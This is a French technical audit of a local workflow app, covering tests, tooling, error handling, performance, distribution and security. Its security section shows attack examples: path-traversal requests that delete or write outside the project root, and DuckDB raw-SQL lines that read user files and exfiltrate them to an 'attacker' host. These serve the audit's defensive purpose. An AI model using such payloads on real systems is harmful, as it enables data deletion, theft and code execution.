# 07 — Santé technique & risques (P3, P4)

> Audit des **barrières automatiques** (tests, lint, types, CI), des **motifs d'erreur**, de la **sécurité** (même en local), de la **performance** à l'échelle et de la **distribution**. Diagnostic uniquement — pas de remédiation.

## TL;DR

- **Aucune barrière automatique** : pas de TypeScript, pas de PropTypes, pas d'ESLint, pas de Prettier, pas de pre-commit, pas de CI (`.github/workflows` absent), pas de `pyproject.toml`. La qualité repose sur la discipline d'un seul auteur (P3).
- **10 scripts de test backend `_test_*.py`** : smoke tests honnêtes mais hors framework (pas de `pytest`, pas de `conftest`, assertions au top-level, créent de vrais projets sur disque). Couverture frontend : **0**.
- **2 points chauds majeurs côté code** : `engine.py` (2 472 lignes) et `Inspector.jsx` (1 479 lignes) — fichiers monolithiques avec runners et configurateurs côte à côte.
- **3 risques sécurité concrets** malgré « local-only » : CORS `*` + aucune authentification + path-traversal exploitables côté `pid` et `file.filename` (P4 ; détail § 5).
- **Distribution Windows-only** : `start.ps1`/`start.bat` invoquent un `.venv` Windows. Aucun installeur multiplateforme, **0 release publiée**, **0 tag git**, pas de CHANGELOG.

---

## 1. Points chauds de rendu et de couplage

### 1.1 Tailles de fichiers (LOC)

| Fichier | LOC | Rôle | Diagnostic |
|---|---|---|---|
| `backend/engine.py` | **2 472** | Runners de tous les blocs + signatures + preview/profile + I/O parquet + helpers SQL | Fichier monolithique. Le runtime du moteur, l'API d'aperçu, le profilage, la gestion du cache et la lecture des sources cohabitent. Aucune frontière de module. |
| `backend/workflow_doc.py` | 1 007 | Génère le `.xlsx` « Documenter » | Spécifique à un usage, isolable. |
| `frontend/src/components/Inspector.jsx` | **1 479** | 12 composants `*Config` + bulle d'aide + sélecteurs de colonnes + helper `_colref/_lit/_valExpr` | Monolithe : chaque ajout de bloc augmente le fichier. Pas d'isolation par bloc. |
| `frontend/src/components/WorkflowEditor.jsx` | **1 156** | Toute la logique du canevas : nodes/edges/cache/save/run-stream/menus | Tient parce que c'est l'auteur ; à 2 mains, blocages garantis. |
| `frontend/src/components/routing.jsx` | 936 | Conditions + flow-map + sorties + testeur (Validation) | OK pour la *complexité* du bloc, mais à exploser. |
| `backend/main.py` | 338 | 30 routes FastAPI | Lisible — un sentinel à conserver. |

> Ces 5 fichiers concentrent ~50 % du code applicatif. Les modifier sans casser un autre bloc demande de tenir mentalement tout le contexte ; aucune frontière de module ne le facilite.

### 1.2 Points chauds de rendu (React)

- Le canevas (`WorkflowEditor`) garde **8 `useState`** + 5 `useRef` + 5 `useMemo`/`useCallback` (compté `WorkflowEditor.jsx:230-258`). À chaque frappe dans `wfName`, tout le composant ré-encode `nodes/edges` pour l'autosave (`:343-344`).
- **`memo()` n'est utilisé nulle part** dans le front (zéro occurrence) — chaque nœud React Flow est ré-rendu à chaque changement de status.
- `decoratedNodes` (`WorkflowEditor.jsx:832-846`) recopie tous les nodes à chaque tick du `useMemo` ; OK tant que `nodes` est court (< 100), pénalisant au-delà.
- `dirtyMap` (`WorkflowEditor.jsx:806-828`) recalcule la topologie complète à chaque mutation — bonne implémentation mais O(N + E) à chaque rendu.

### 1.3 Couplage transverse

- **`Inspector.jsx`** importe `routing.jsx`, `validateHelpers.js`, `QueryBuilder.jsx` — couplage acceptable.
- **`WorkflowEditor.jsx`** importe **14 composants de nœud** + Inspector + BlockEditor + WorkflowFlow + DataPreview + 5 helpers. C'est le hub du front : une déclaration unique de `DEFAULT_DATA`, de `NODE_OUTPUTS`, de `TYPE_COLOR`, **dupliquée côté backend** dans `engine.py` (`OUTPUTS` à la ligne 33-39). La cohérence est par convention, pas par contrat.
- **Trois palettes de couleurs** dupliquent en JS (`WorkflowEditor.jsx:106-118`) ce que `:root` du CSS porte (`styles.css:18-30`). Voir aussi § 06.

### 1.4 Code mort / fonctions inutilisées

- `--bg`, `--radius-lg`, `--accent-d` (CSS) : référencés 1, 1, 3 fois — quasi morts (voir § 06).
- `_selftest.py` (backend, 2 807 octets) : entrée séparée des `_test_*.py`, probablement un smoke historique — non listé dans les *tests* (`_selftest.py` ne suit pas la convention).
- Pas d'autres « gros morts » repérés à la lecture.

---

## 2. Tests — recensement

### 2.1 Inventaire

10 fichiers dans `backend/`, **tous au top-level**, préfixe `_test_*.py` (l'underscore tient à l'écart les collecteurs `pytest`/`unittest` par défaut) :

| Fichier | LOC | Couvre |
|---|---|---|
| `_selftest.py` | ~80 | smoke historique (non documenté ici) |
| `_test_cache.py` | 58 | cache Source (re-lecture, force, fingerprint) |
| `_test_dedup.py` | ~50 | dedup `kept/dups/uniques` |
| `_test_features.py` | 115 | pivot, clean, union, lock, preview filters, profile |
| `_test_formula.py` | ~70 | compilateur de formules Excel (Calc) |
| `_test_group.py` | **137** | atomicité du contrôle de groupe (Validation) |
| `_test_keys.py` | ~110 | analyse « clés multiples » + `engine.keys_group` |
| `_test_route.py` | ~120 | mode route de Validation |
| `_test_validate.py` | ~80 | mode validation basique |
| `_test_value_when.py` | 133 | fonction de groupe `value_when` (Calc) |

### 2.2 Nature des tests — observations

Caractéristiques d'écriture (échantillon `_test_cache.py`, `_test_group.py`) :

- **Pas de framework** : aucun `import pytest`, aucun `class TestXxx(unittest.TestCase)`. Les `assert` sont au niveau du module ; un échec arrête le script.
- **Effets de bord réels** : `storage.create_project("CacheTest")` écrit dans `projects/cachetest/`, lit/écrit vraiment du parquet. Un seul `storage.delete_project(pid)` en fin de fichier. Si un `assert` plante, **le projet de test reste sur disque**. Pas de `try/finally`, pas de fixture.
- **Isolation par nom** : chaque fichier crée un projet nommé en dur (`"CacheTest"`, `"DedupTest"`, `"Feat"`). Deux lancements concurrents s'écrasent.
- **Pas d'`assertEqual` typé** : la lisibilité des échecs dépend du *message* passé au `assert`. Souvent OK (`assert ... , "cached source parquet must not be rewritten"`) mais inégal.
- **Pas de test d'API HTTP** : tout passe par les fonctions Python directement. Aucun test ne valide une route FastAPI ni la sérialisation JSON.
- **Pas de test de régression sur les bugs ferméssauf cas spécifique** (`_test_group.py` est explicitement une *regression* — voir docstring). Bonne pratique localement.

### 2.3 Frontend : zéro test

- Pas de Vitest, pas de Jest, pas de Cypress, pas de Playwright dans `package.json`.
- Pas de fichier `*.test.*`/`*.spec.*` dans `frontend/src/`.

### 2.4 Absences structurelles

- **Pas de CI** : `.github/workflows/` n'existe pas (`find -name .github` ne retourne rien hors `.git/hooks/pre-commit.sample`). Aucun pipeline n'exécute les tests à chaque push, aucun verrou contre une régression dans `engine.py`.
- **Pas d'orchestrateur local** : pas de `make test`, pas de `tox`, pas de `nox`. Lancer la suite = `python _test_cache.py && python _test_dedup.py && …` à la main.
- **Pas de couverture mesurée** : pas de `coverage.py`, pas de `pytest-cov`.

---

## 3. Outillage qualité — absences

| Outil | Présent | Conséquence |
|---|---|---|
| **TypeScript** | ❌ (pas de `tsconfig.json`, type module = ES) | Aucune garantie sur les *shapes* (Validation a un schéma `data` énorme : `Inspector.jsx:127-134` — toute typo silencieuse). |
| **PropTypes** | ❌ (0 occurrence) | Idem. |
| **ESLint** | ❌ (pas de config) | Une `// eslint-disable-next-line react-hooks/exhaustive-deps` apparaît dans le code (`routing.jsx:35`, `BlockEditor.jsx:109, 176`, `DataPreview.jsx:32, 41`) — comme si ESLint était utilisé, mais sans config en place ⇒ règles non vérifiées en CI. |
| **Prettier** | ❌ | Le style varie : `''` quotes vs `""`, indentation 2 espaces majoritairement OK. |
| **pre-commit** | ❌ (seul `.git/hooks/pre-commit.sample` par défaut) | Aucun verrou local. |
| **`pyproject.toml`** | ❌ (uniquement `requirements.txt`) | Pas de groupe `[tool.ruff]`, `[tool.pytest]`, `[tool.mypy]`. |
| **Ruff / Flake8 / Mypy** | ❌ | Les `# noqa: BLE001` apparaissent dans `main.py` — laissés au cas où, sans linter actif. |
| **dotenv** | ❌ | Pas d'env de prod / dev (acceptable : 100 % local). |
| **Vite plugin lint** | ❌ | Build silencieux. |

---

## 4. Gestion d'erreurs — motifs en place et incohérences

### 4.1 Backend

- **`HTTPException(400, str(e))` enveloppé dans `try/except Exception as e: # noqa: BLE001`** : motif récurrent dans `main.py` (peek, run_workflow, preview, profile, keys_group, route_preview, split_scan, document_workflow, open_file, open_files_folder). **8 routes** suivent ce motif. C'est une *catch-all* qui transforme tout en 400 — l'info utile passe en `detail`.
- **Granularité** : un `KeyError` côté engine devient un 400 « 'foo' » très peu pédagogique. Aucune classe d'exception métier (`InputNotConnectedError`, `ColumnNotFoundError`, …) ne sert à différencier *bloquant* de *récupérable*.
- **`run-stream`** (`main.py:263-274`) **ne capture rien** : si `iter_run_workflow` lève au-dessus de l'itération, le `gen()` plante et le SSE se ferme côté serveur. Côté client (`WorkflowEditor.jsx:752-759`), `event === 'error'` est attendu — pas une fermeture brutale.

### 4.2 Frontend

- **Trois motifs cohabitent** :
  1. **`banner`** (`WorkflowEditor.jsx:250, 938`) — bannière unique au niveau du WorkflowEditor, dismissable.
  2. **`ErrorBoundary`** (`BlockEditor.jsx:50-52`, `ErrorBoundary.jsx`) — locale à la vue droite du BlockEditor. Très bien.
  3. **`alert()` / `confirm()` natifs** (`ProjectList.jsx:22`, `ProjectView.jsx:27, 34, 56`) — pour les actions destructives et les ouvertures de fichier. Style hors charte.
- **`alive` flags** disséminés (`WorkflowEditor.jsx:263-335`, `ProjectView.jsx`, …) — utiles pour les `useEffect` async. Motif **répété 19 fois** mais pas factorisé en hook (`useSafeEffect`). Premier signal P4 (« une vraie couche d'état »).
- **Échecs API silencieux** dans les actions de la page projet : `deleteProject`, `deleteFile`, `deleteWorkflow`, `uploadFile` n'ont pas de `.catch` (déjà signalé en 05 § constat #10).
- **`api.openFile(...)` est l'unique appel à utiliser `alert()` en cas d'erreur** (`ProjectView.jsx:34`) — incohérence avec le reste de l'app qui utilise des `banner`/`qb-warn`.

---

## 5. Sécurité / vie privée (P4)

> L'app se présente comme **locale** (un seul utilisateur sur sa machine). Néanmoins, le backend tourne sur `127.0.0.1:8000` et toute page web ouverte dans le navigateur peut tenter d'y accéder. Voici les surfaces réellement exposées.

### 5.1 CORS ouvert + aucune authentification

```python
# backend/main.py:27-32
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_methods=["*"],
    allow_headers=["*"],
)
```

**Combiné avec l'absence de token/cookie/auth**, n'importe quelle page web visitée pendant que Roade tourne peut :
- lister, créer, supprimer des projets (`POST /api/projects`, `DELETE /api/projects/{pid}`) ;
- uploader des fichiers arbitraires dans n'importe quel projet (`POST /api/projects/{pid}/files`) ;
- déclencher un run (`POST/GET /api/projects/{pid}/workflows/{wid}/run-stream`) ;
- récupérer un fichier (`GET /api/projects/{pid}/files/{name}` — réponse renvoyée au site malveillant).

C'est un vecteur **CSRF + exfiltration** local par browser-pivot. Sévérité : **majeur**.

### 5.2 Path traversal via `pid` (non assaini)

`storage.project_dir(pid)` (`storage.py:41-42`) fait :

```python
def project_dir(project_id: str) -> Path:
    return ROOT / project_id
```

**`pid` est utilisé tel quel** — pas de regex, pas d'`.resolve()`+vérification que le résultat est sous `ROOT`. Le seul filtre est `_slug()` côté **création** (`storage.py:29-31`), mais les autres routes (`delete_project`, `list_files`, `upload_file`, `download_file`, `delete_file`, `open_file`, `open_files_folder`) acceptent n'importe quel `pid`.

**Cas d'attaque** :
- `DELETE /api/projects/..%2F..%2Fimportant-folder` → si `pid = "../../important-folder"`, `d = ROOT / "../../important-folder"`, et `shutil.rmtree(d)` (`storage.py:81`) supprime ce qui s'y trouve.
- `POST /api/projects/..%2F..%2Fsomewhere/files` → `fd = ROOT / "../../somewhere/files"`, l'upload écrit n'importe où.

`_resolve_file` (`main.py:75-89`) ne couvre que `name` + `subdir`, **pas le `pid`**. Sévérité : **majeur**.

### 5.3 Nom de fichier upload non assaini

```python
# main.py:113-118
dest = fd / file.filename
with dest.open("wb") as out:
    while chunk := await file.read(1 << 20):
        out.write(chunk)
```

`file.filename` peut contenir des séparateurs ou des `..`. Sur Windows, Path normalise certains chemins ; un `file.filename = "../etc.txt"` finit hors de `files/`. Sévérité : **majeur**.

### 5.4 SQL DuckDB en mode `raw` : exécution de fonctions filesystem

Le bloc SQL en mode `raw` envoie le contenu de `query` à DuckDB (`engine.py:344-352`). DuckDB exposera nativement `read_csv_auto('chemin')`, `read_parquet('chemin')`, `COPY ... TO ...`, et — selon les versions — `httpfs` (HTTP/S3) et `read_blob`. Un workflow JSON **importé d'ailleurs** peut donc :
- lire n'importe quel fichier que l'utilisateur peut lire (`SELECT * FROM read_csv_auto('C:\Users\<x>\…')`),
- exfiltrer via `COPY (SELECT …) TO 'C:\public\…'`,
- ou — si `httpfs` est chargé par défaut — `COPY … TO 'https://attacker/…'`.

Sévérité : **majeur** si l'utilisateur ouvre un workflow tiers.

### 5.5 `os.startfile` / `subprocess.Popen` sur des chemins de fichiers contrôlés

```python
# main.py:137-145
def _open_in_os(path) -> None:
    if sys.platform.startswith("win"):
        os.startfile(str(path))
    elif sys.platform == "darwin":
        subprocess.Popen(["open", str(path)])
    else:
        subprocess.Popen(["xdg-open", str(path)])
```

`_resolve_file` filtre déjà les paths hors racine — donc l'attaquant doit **d'abord** uploader un fichier malveillant via § 5.3, puis demander à `os.startfile(...)` de l'ouvrir. Sur Windows, `os.startfile` lance l'application associée à l'extension : un `.lnk`, un `.bat`, un `.scr` exécutent du code. Sévérité : **majeur** (chaîné avec § 5.3).

### 5.6 Endpoint SSE `run-stream` sans annulation côté serveur

`run_stream` (`main.py:263-274`) ne propose pas d'annulation. Un client malicieux peut ouvrir plusieurs SSE et saturer le moteur. Sévérité : **mineur** (uniquement DoS local).

### 5.7 Pas de validation des bodies JSON

`save_workflow`, `route_preview`, `split_scan`, `validate_test`, `create_project` acceptent `payload: dict = Body(...)` sans modèle Pydantic. Une *workflow.json* tordue peut faire planter l'engine de façon imprévue. Sévérité : **mineur**.

### 5.8 Vie privée — données restent locales

- Aucune télémétrie (pas de `fetch` sortant dans le front, pas d'appel HTTP hors `/api/*`).
- Les fichiers ne quittent jamais la machine (sauf via § 5.4 si exécuté).

---

## 6. Performance à l'échelle

### 6.1 Beaucoup de nœuds

- `decoratedNodes`/`decoratedEdges` recopient tout à chaque tick (`WorkflowEditor.jsx:832-856`). Coût linéaire — OK jusqu'à ~100 nœuds, lent au-delà.
- `dirtyMap` topologique O(N + E) à chaque rendu (`WorkflowEditor.jsx:806-828`).
- **`memo()` absent partout** → aucun nœud n'est *cheap* à re-rendre. Sur 200 blocs, chaque frappe au clavier dans `wfName` peut produire 200 réconciliations React.
- React Flow gère lui-même la virtualisation graphique, donc l'impact se concentre sur React + JS, pas sur le DOM.

### 6.2 Gros fichiers

- **Lecture Excel** : `pd.read_excel(...)` (`engine.py:208`) est **synchrone**. Pour un classeur de 50 Mo, l'utilisateur a un *progress estimate* calibré (`WorkflowEditor.jsx:671-710`) mais le backend reste bloqué — pas de chunking, pas de streaming.
- **Aperçu paginé** (`engine.py:2339+`, `preview_node`) avec `limit/offset` — bonne pratique.
- **Cap analyses à 200 valeurs distinctes** (`engine.py:1106-1138`) + drapeau `truncated`.
- **Pas de seuil d'alerte** côté UI : un Pivot sur 1 M de lignes ne lève aucun warning avant exécution.
- **DuckDB en mémoire** : tout le pipeline charge les parquets ; pas de support « hors mémoire ». OK pour <100 Mo, problématique au-delà.

### 6.3 Code splitting / lazy load

- **`React.lazy` absent** (0 occurrence). L'app entière (~6 000 LOC JSX + dépendances) charge d'un coup au démarrage. Pas de séparation BlockEditor/DataPreview/WorkflowFlow.
- **Vite par défaut** : build unique, pas de configuration de chunks.
- **CSS unique** (cf. 06).

### 6.4 Mesures non disponibles

- Pas de profiling intégré (pas de `performance.mark`), pas de logs côté serveur sur les temps d'exécution par nœud.
- Le calibrage Source (`WorkflowEditor.jsx:671-710`) est la **seule** boucle de feedback de performance — bien fait, mais isolée.

---

## 7. Distribution & onboarding

### 7.1 Lancement

- **`start.ps1`** (`start.ps1`) : lance deux fenêtres PowerShell — backend uvicorn + `npm run dev`. Hardcode `backend\.venv\Scripts\python.exe` → **dépend d'un venv déjà créé manuellement**.
- **`start.bat`** : équivalent en `cmd`.
- **Aucun script Unix** (`start.sh`).
- **Aucun installeur** (`.msi`, `.exe`, `.dmg`, `.deb`, AppImage).
- **Aucun Docker / docker-compose**.
- **Aucun mode « build de prod »** : `vite build` n'est pas utilisé pour servir le front en local (pas de combined script qui sert le bundle depuis FastAPI). On reste en `vite dev` permanent.

### 7.2 Releases & versions

- `git tag -l` → **aucune sortie**, **aucune tag git**.
- Pas de `CHANGELOG.md`, pas de `HISTORY.md`.
- `package.json` : `"version": "0.1.0"` (`frontend/package.json:5`) — figé. Pas de bump automatique.
- Aucun manifeste de version côté backend (`requirements.txt` seul ; pas de `__version__` dans `engine.py`/`main.py`).

### 7.3 README

- **93 lignes**, FR (et un README EN ajouté récemment — commit `3e749ce`). Liste des blocs + quelques fonctions. **Pas de section « Installation »**, pas de section « Premier projet », pas de copies d'écran. Orienté développeur de l'app, pas utilisateur final.

### 7.4 Dépendances

- **Backend** : 7 paquets épinglés à `>=` (`requirements.txt`). Pas de lockfile (`requirements.lock`, `poetry.lock`, `uv.lock`). Reproductibilité de l'installation **non garantie**.
- **Frontend** : 3 deps + 2 devDeps (`package.json`). Pas de `package-lock.json` versionné (à vérifier ; non listé par `ls`).

---

## 8. Synthèse — où sont les risques pratiques

Trois catégories distinctes :

1. **Risques sécurité concrets et chaînables** (§ 5.1, 5.2, 5.3, 5.5) : CORS `*` + path-traversal + upload non assaini + `os.startfile` ⇒ un site malicieux peut, sans interaction utilisateur, **uploader un fichier arbitraire et le faire exécuter**. La mention « usage local » ne neutralise pas ces vecteurs.
2. **Risques qualité structurels** (§ 2, 3) : tests hors framework + zéro CI + zéro typage = chaque modification touche un risque non couvert. Le moteur (`engine.py`, 2 472 lignes) est l'endroit où ces absences pèsent le plus.
3. **Risques distribution** (§ 7) : installation manuelle, Windows-only, aucune release, aucun changelog. Le produit ne sait pas se *distribuer* — pas une question de qualité, une question d'existence pour un nouvel utilisateur.

Les **bons réflexes existants** à préserver — déjà signalés ailleurs et pertinents ici : `ErrorBoundary` ciblée, `prune_orphan_edges` + `prune_node_outputs` qui maintiennent la cohérence disque/JSON, calibrage automatique du débit Source, signature de cache stable (`nodeDataSig` côté front, `_node_signature` côté back). Ce sont des fondations à *contractualiser* plutôt qu'à refaire.
